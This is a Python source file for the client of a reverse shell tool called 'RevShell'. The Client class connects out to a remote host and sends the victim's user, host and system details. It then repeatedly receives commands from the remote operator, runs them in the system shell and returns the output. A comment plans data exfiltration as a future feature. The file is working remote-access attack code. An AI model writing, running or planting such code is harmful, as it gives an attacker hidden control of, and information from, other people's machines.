# TODO: create handling for data exfiltration
import getpass

from .nodeutils import (
    os,
    shutil,
    time,
    Path,
    platform,
    subprocess,
    struct,
    sys,
    socket,
    StreamSocket,
    utils
)


class Client(StreamSocket):
    """TCP socket client class for the command shell"""
    # TODO: add handling for custom shell executables
    # TODO: fix issues with clear not working in all terminals
    def __init__(
        self,
        rhost: str,
        port: int,
        opsys: str,
        verbose: bool,
        debug: bool,
        shell: str = None
    ):
        shell_path, name = self.get_exec(opsys, shell)
        if verbose:
            utils.status(f"shell => {name}")
        super().__init__(rhost, port, shell_path, debug)
        self.Verbose = verbose

    def execute(self, command: str) -> tuple:
        """Execute the command using system shell subprocess,
        returns the a list of stdin, stdout, and stderr."""
        # TODO: continue/finish adding special commands
        family = self.check_special(command)

        if family is not None:
            if family == "about":
                return self.about_host(), b""

            if family == "clear":
                return utils.Ansi.clear().encode(), b""

            if family == "resolve":
                return self.nslookup(command), b""

            if family == "cd":
                exists, path = self._change_dir(command)
                if exists:
                    return path.encode(), b""
                else:
                    return b"", f"Cannot resolve path {path}".encode()

            if family == "ls":
                if utils.OPSYS != "nt":
                    command = f"{command} -A --color"

        stdout, stderr = self._run_cmd(command, self.Shell)
        return stdout, stderr

    @staticmethod
    def shutdown(sock: socket.socket) -> None:
        """Cleanup and close the specified socket"""
        try:
            sock.shutdown(socket.SHUT_WR)
        except OSError:
            pass
        finally:
            sock.close()

    def connect(self) -> None:
        """Initiate connection to remote server shell"""
        # TODO: configure timeouts and blocking, then test
        sock = socket.socket()
        #sock.settimeout(60)

        try:
            sock.connect((self.Address, self.Port))
        except socket.timeout:
            utils.throw(f"Connection with {self.Address}, timed out.")
        except:
            utils.throw(f"Could not establish connection with {self.Address}")

        try:
            # receive <== connection established message
            establish_msg = self.recv_msg(sock)
            utils.status(establish_msg)

            self.LastWD = str(Path.home())
            os.chdir(str(Path.home()))
            hostinfo, sysinfo = self.get_sysinfo()

            # send ==> current user/host information
            self.send_msg(sock, hostinfo)

            # send ==> system information
            self.send_msg(sock, sysinfo)

            while True:
                # receive <== command to execute
                command = self.recv_msg(sock)
                family = self.check_special(command)

                if family == "exit":
                    if self.Verbose:
                        utils.stdin_status("exit")
                        utils.status("Exiting RevShell.")
                    break

                stdout, stderr = self.execute(command)

                if stderr == b"":
                    output = stdout
                    level = "output"
                else:
                    output = stderr
                    level = "error"

                if self.Debug:
                    # TODO: fix and test debug options
                    utils.status(output.decode(), level, command)
                elif self.Verbose:
                    utils.stdin_status(command, level)

                # send ==> command output
                if level == "output":
                    self.send_output(sock, output.decode(), "output")
                else:
                    self.send_output(sock, output.decode(), "error")
        except Exception as exc:
            self.shutdown(sock)
            self.except_handler(exc)
        finally:
            self.shutdown(sock)
